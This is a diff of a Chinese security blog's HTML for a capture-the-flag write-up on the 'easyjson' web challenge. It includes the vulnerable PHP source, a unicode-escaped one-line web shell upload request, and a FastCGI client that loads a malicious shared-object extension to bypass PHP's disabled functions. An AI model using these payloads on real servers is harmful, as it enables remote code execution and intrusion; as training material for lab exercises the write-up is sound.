&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildAllPacket</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Ensure new requestID is not already being tracked</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_requestCounter++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_requestCounter &gt;= <span class="number">65536</span> <span class="comment">/* or (1 &lt;&lt; 16) */</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_requestCounter = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $id = <span class="keyword">$this</span>-&gt;_requestCounter;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_requests[$id]));</span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>), $id);</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$sock = stream_socket_client(<span class="string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);</span><br><span class="line">$client = <span class="keyword">new</span> Client();</span><br><span class="line">$payload_file = <span class="string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,</span><br><span class="line">    <span class="comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span></span><br><span class="line">);</span><br><span class="line">$data = $client-&gt;buildAllPacket($params, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">fwrite($sock, $data);</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">protected</span> $keepAlive = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">protected</span> $_requests = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $_requestCounter = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params">$type, $content, $requestId = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $offset = <span class="hljs-number">0</span>;<br>        $totLen = strlen($content);<br>        $buf    = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span><br>            $part = substr($content, $offset, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);<br>            $segLen = strlen($part);<br>            $buf .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span><br>                . chr($type)                    <span class="hljs-comment">/* type */</span><br>                . chr(($requestId &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>                . chr($requestId &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>                . chr(($segLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span><br>                . chr($segLen &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>                . $part;                        <span class="hljs-comment">/* content */</span><br>            $offset += $segLen;<br>        &#125; <span class="hljs-keyword">while</span> ($offset &lt; $totLen);<br>        <span class="hljs-keyword">return</span> $buf;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params">$name, $value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $nlen = strlen($name);<br>        $vlen = strlen($value);<br>        <span class="hljs-keyword">if</span> ($nlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            $nvpair = chr($nlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            $nvpair = chr(($nlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($nlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($vlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            $nvpair .= chr($vlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            $nvpair .= chr(($vlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($vlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> $nvpair . $name . $value;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params">$data, $length = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ($length === <span class="hljs-literal">null</span>) &#123;<br>            $length = strlen($data);<br>        &#125;<br>        $array = <span class="hljs-keyword">array</span>();<br>        $p = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ($p != $length) &#123;<br>            $nlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($nlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $nlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $vlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($vlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $vlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);<br>            $p += ($nlen + $vlen);<br>        &#125;<br>        <span class="hljs-keyword">return</span> $array;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $params, $stdin</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span><br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;<br>            &#125;<br>            $id = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;<br>        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[$id]));<br>        $request = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), $id);<br>        $paramsRequest = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> ($params <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>            $paramsRequest .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair($key, $value, $id);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($paramsRequest) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, $paramsRequest, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">if</span> ($stdin) &#123;<br>            $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, $stdin, $id);<br>        &#125;<br>        $request .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, $id);<br>        <span class="hljs-keyword">return</span> $request;<br>    &#125;<br>&#125;<br>$sock = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);<br>$client = <span class="hljs-keyword">new</span> Client();<br>$payload_file = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;<br>$params = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,<br>    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,<br>    <span class="hljs-comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span><br>);<br>$data = $client-&gt;buildAllPacket($params, <span class="hljs-string">&#x27;&#x27;</span>);<br>fwrite($sock, $data);<br>var_dump(fread($sock, <span class="hljs-number">4096</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p><strong>s.php</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> antsystem(<span class="string">&quot;/readflag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> antsystem(<span class="hljs-string">&quot;/readflag&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>参考教程：</p>
 <ol>
@@ -281,181 +285,149 @@
 <li>得到 flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li>
 </ul>
 <p><strong>题目源码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;security.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>$sandbox = <span class="hljs-string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>var_dump($sandbox);<br><span class="hljs-keyword">if</span>(!file_exists($sandbox))&#123;<br>    mkdir($sandbox);<br>    file_put_contents($sandbox.<span class="hljs-string">&quot;index.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);<br>&#125;<br>$action = $_GET[<span class="hljs-string">&#x27;action&#x27;</span>];<br>$content = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><br><span class="hljs-keyword">if</span>($action == <span class="hljs-string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="hljs-string">&#x27;filename&#x27;</span>,$_GET[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="hljs-string">&#x27;content&#x27;</span>,$content))&#123;<br>    $content = json_decode($content);<br>    $filename = $_GET[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    $filecontent = $content-&gt;content;<br>    $filename = $sandbox.$filename;<br>    file_put_contents($filename,$filecontent.<span class="hljs-string">&quot;\n Powered By Dbapp OSS.&quot;</span>);<br>&#125;<span class="hljs-keyword">elseif</span>($action == <span class="hljs-string">&quot;reset&quot;</span>)&#123;<br>    $files = scandir($sandbox);<br>    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file) &#123;<br>        <span class="hljs-keyword">if</span>(!is_dir($file))&#123;<br>            <span class="hljs-keyword">if</span>($file !== <span class="hljs-string">&quot;index.php&quot;</span>)&#123;<br>                unlink($sandbox.$file);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Security Check Failed.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p><strong>数据包</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?source&#x3D;1&amp;action&#x3D;write&amp;filename&#x3D;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?source=1&amp;action=write&amp;filename=index.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: easyjson.xhlj.wetolink.com<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">Cache-Control</span>: max-age=0<br><span class="hljs-attribute">X-Forwarded-For</span>: 127.0.0.1<br><span class="hljs-attribute">X-Originating-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-IP</span>: 127.0.0.1<br><span class="hljs-attribute">X-Remote-Addr</span>: 127.0.0.1<br><span class="hljs-attribute">Content-Length</span>: 191<br><br>&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;<br></code></pre></td></tr></table></figure>
 <p>参考教程：</p>
 <ol>
 <li>西湖论剑初赛Web1/5：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li>
 </ol>
 
-    </div>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
